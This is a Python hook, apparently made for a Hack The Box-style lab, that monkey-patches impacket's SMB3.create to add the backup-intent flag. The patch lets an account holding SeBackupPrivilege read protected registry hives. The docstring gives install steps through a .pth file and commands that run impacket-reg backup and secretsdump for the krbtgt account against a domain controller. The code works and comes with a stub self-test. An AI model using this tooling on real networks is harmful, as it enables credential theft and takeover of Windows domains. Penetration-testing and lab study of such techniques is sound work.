#!/usr/bin/env python3
"""bkpintent_hook.py — HTB_BKP-gated FILE_OPEN_FOR_BACKUP_INTENT patch.

Backup-operator finish: with SeBackupPrivilege you can read SAM/SYSTEM/SECURITY
(or any ACL-protected file) — but only if the CreateFile call asks for backup
semantics, i.e. sets FILE_OPEN_FOR_BACKUP_INTENT (0x00004000) in CreateOptions.
Impacket never sets it, so reg.py/secretsdump.py and friends come back
STATUS_ACCESS_DENIED even on an account that legitimately holds the privilege.

This hook wraps SMB3.create() and ORs 0x4000 into createOptions when env
HTB_BKP is set, so every existing impacket SMB3 path starts asking for backup
semantics.

Install (a .pth — sitecustomize.py is shadowed by the distro python):

    echo "import bkpintent_hook" > <site-packages>/bkpintent.pth
    cp references/bkpintent_hook.py <site-packages>/

Use:

    HTB_BKP=1 impacket-reg corp.local/user:pass@dc.corp.local backup -o /tmp/reg
    HTB_BKP=1 impacket-secretsdump -just-dc-user krbtgt corp.local/user:pass@dc

Caveats (these are why the raise is not silent):
- The privilege must be in the token AND enabled: SeBackupPrivilege, or an
  account nested in Backup Operators. Backup Operators' privilege is
  filtered out of a normal logon token; you need the elevated token (SMB
  session from a service context, or RDP/schtasks-launched shell).
- SMB1 paths (SMB1.create) are not patched — secretsdump falls back to SMB1
  with `-use-vss` off if SMB2 negotiation fails; force SMB2 by dialing 445.
- Server-side "Backup Operators only" (SeBackupPrivilege checked by the
  service, not the filesystem) is unaffected — this only changes the wire.

Verify it engaged: HTB_BKP_DBG=1 prints each patched create call.
"""
from __future__ import annotations

import inspect
import os
import sys

FILE_OPEN_FOR_BACKUP_INTENT = 0x00004000
_ENABLED = os.environ.get("HTB_BKP", "") not in ("", "0")
_DEBUG = os.environ.get("HTB_BKP_DBG", "") not in ("", "0")
_installed = False


def _log(msg: str) -> None:
    if _DEBUG:
        sys.stderr.write(f"[bkpintent] {msg}\n")


def install() -> bool:
    """Patch impacket.smb3.SMB3.create. Returns True when the hook is active."""
    global _installed
    if _installed:
        return True
    if not _ENABLED:
        _log("HTB_BKP unset — hook loaded but inactive")
        return False
    try:
        from impacket.smb3 import SMB3
    except Exception as e:  # impacket not present / different layout
        sys.stderr.write(f"[bkpintent] impacket.smb3 unavailable: {e}\n")
        return False

    orig = SMB3.create
    sig = inspect.signature(orig)
    if "createOptions" not in sig.parameters:
        sys.stderr.write("[bkpintent] createOptions not in SMB3.create signature — "
                         "impacket version changed, patch the call site instead\n")
        return False

    def patched(self, *a, **kw):
        bound = sig.bind(self, *a, **kw)
        try:
            cur = bound.arguments.get("createOptions", 0) or 0
            bound.arguments["createOptions"] = cur | FILE_OPEN_FOR_BACKUP_INTENT
            _log(f"create({bound.arguments.get('fileName')!r}) options 0x{cur:08x} "
                 f"-> 0x{bound.arguments['createOptions']:08x}")
        except Exception as e:
            _log(f"bind failed, passing through: {e}")
        return orig(*bound.args, **bound.kwargs)

    SMB3.create = patched  # type: ignore[assignment]
    # secretsdump/reg build helpers on top of SMB3Connection; nothing else needed.
    _installed = True
    _log("installed")
    return True


def selftest() -> int:
    """Exercise the patch against a stub impacket module (no network, no impacket)."""
    import types

    class FakeSMB3:
        def create(self, treeId, fileName, desiredAccess, shareAccess,
                   createDisposition, createOptions, impersonationLevel=2):
            return {"fileName": fileName, "createOptions": createOptions}

    pkg = types.ModuleType("impacket")
    sub = types.ModuleType("impacket.smb3")
    sub.SMB3 = FakeSMB3
    pkg.smb3 = sub
    saved = {k: sys.modules.get(k) for k in ("impacket", "impacket.smb3")}
    sys.modules["impacket"] = pkg
    sys.modules["impacket.smb3"] = sub

    os.environ["HTB_BKP"] = "1"
    globals()["_ENABLED"] = True
    globals()["_installed"] = False
    assert install(), "install failed"

    obj = FakeSMB3()
    r = obj.create(1, "\\Windows\\System32\\config\\SAM", 0x00120089, 7, 1, 0)
    assert r["createOptions"] & FILE_OPEN_FOR_BACKUP_INTENT, r
    assert r["createOptions"] == FILE_OPEN_FOR_BACKUP_INTENT, r
    # positional and keyword forms must both be patched
    r2 = obj.create(treeId=1, fileName="x", desiredAccess=1, shareAccess=7,
                    createDisposition=1, createOptions=0x40)
    assert r2["createOptions"] == 0x40 | FILE_OPEN_FOR_BACKUP_INTENT, r2

    for k, v in saved.items():
        if v is None:
            sys.modules.pop(k, None)
        else:
            sys.modules[k] = v
    print("selftest: ok (positional + keyword create patched, flag 0x4000 applied)")
    return 0


def _auto() -> None:
    if _ENABLED:
        install()


_auto()

if __name__ == "__main__":
    if "--selftest" in sys.argv or "selftest" in sys.argv:
        raise SystemExit(selftest())
    ok = install()
    print(f"active={ok} flag=0x{FILE_OPEN_FOR_BACKUP_INTENT:04x}")
